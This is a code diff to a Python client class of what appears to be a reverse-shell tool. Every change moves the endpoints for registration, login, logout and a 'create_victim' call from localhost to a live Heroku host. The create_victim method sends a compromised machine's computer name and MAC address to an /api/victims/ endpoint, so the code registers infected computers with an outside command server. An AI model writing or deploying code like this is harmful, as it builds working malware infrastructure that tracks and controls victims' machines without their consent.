@@ -9,9 +9,9 @@ class Client(object):
         self.session = requests.Session()
 
     def register(self):
-        r1 = self.session.get('http://localhost:8000/reverse_shell/register/')
+        r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/register/')
         csrf = r1.cookies['csrftoken']
-        r2 = self.session.post('http://localhost:8000/reverse_shell/register/',
+        r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/register/',
                                data={
                                    'csrfmiddlewaretoken': csrf,
                                    'username': self.username,
@@ -23,9 +23,9 @@ class Client(object):
     def login(self):
         session_id = None
         # Validate login first
-        r1 = self.session.get('http://localhost:8000/reverse_shell/validate-login/')
+        r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/validate-login/')
         csrf = r1.cookies['csrftoken']
-        r2 = self.session.post('http://localhost:8000/reverse_shell/validate-login/',
+        r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/validate-login/',
                                data={
                                    'csrfmiddlewaretoken': csrf,
                                    'username': self.username,
@@ -33,9 +33,9 @@ class Client(object):
                                })
         if r2.status_code == 200:
             # Do the real login
-            r1 = self.session.get('http://localhost:8000/reverse_shell/login/')
+            r1 = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/login/')
             csrf = r1.cookies['csrftoken']
-            r2 = self.session.post('http://localhost:8000/reverse_shell/login/',
+            r2 = self.session.post('https://intense-river-70224.herokuapp.com/reverse_shell/login/',
                                    data={
                                        'csrfmiddlewaretoken': csrf,
                                        'username': self.username,
@@ -45,11 +45,11 @@ class Client(object):
         return r2, session_id
 
     def logout(self):
-        response = self.session.get('http://localhost:8000/reverse_shell/logout/')
+        response = self.session.get('https://intense-river-70224.herokuapp.com/reverse_shell/logout/')
         return response
 
     def create_victim(self, computer_name, mac_address):
-        response = self.session.get('http://localhost:8000/api/victims/')
+        response = self.session.get('https://intense-river-70224.herokuapp.com/api/victims/')
         csrf = response.cookies['csrftoken']
 
         data = {
@@ -59,5 +59,5 @@ class Client(object):
             'logged_in': True,
             'owner': self.username,
         }
-        response = self.session.post('http://localhost:8000/api/victims/', data=data)
+        response = self.session.post('https://intense-river-70224.herokuapp.com/api/victims/', data=data)
         return response
